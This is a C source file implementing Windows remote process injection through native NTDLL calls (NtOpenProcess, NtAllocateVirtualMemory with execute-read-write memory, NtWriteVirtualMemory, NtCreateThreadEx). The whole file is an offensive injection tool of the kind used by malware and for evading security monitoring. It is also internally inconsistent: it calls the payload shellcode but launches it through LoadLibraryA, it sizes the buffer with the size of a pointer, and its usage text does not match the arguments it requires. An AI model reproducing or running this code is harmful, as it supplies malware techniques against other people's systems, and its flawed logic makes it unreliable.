// Process Injection via NTDLL function calls NtOpenProcess, NtAllocateVirtualMemory, NtWriteVirtualMemory, NtCreateThreadEx API

#include <Windows.h>
#include <stdio.h>
#include "syscalls.h"

int Error(const char* str) {
	printf("%s (%u)\n", str, GetLastError());
	return 1;
}

int main(int argc, const char* argv[]) {
	if (argc < 3) {
		printf("Usage: RemoteThreadInjection <PID>\n");
		return 0;
	}
	const unsigned char* shellcode = NULL;
	shellcode = (const unsigned char*)argv[2];
	LPVOID allocation_start;
	SIZE_T allocation_size = sizeof(shellcode);
	HANDLE hProcess, hThread;
	int pid = atoi(argv[1]);
	CLIENT_ID cid; 
	cid.UniqueProcess = (PVOID)pid;
	cid.UniqueThread = 0;
	allocation_start = nullptr;
	OBJECT_ATTRIBUTES objAttr; 
	InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);
	NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &cid);
	if (!hProcess)
		return Error("Failed to open process");
	NtAllocateVirtualMemory(hProcess, &allocation_start, 0, &allocation_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	NtWriteVirtualMemory(hProcess, allocation_start, (PVOID)shellcode, allocation_size, 0);
	NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, hProcess, (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA"), allocation_start, FALSE, NULL, NULL, NULL, nullptr);
	return 0;
}

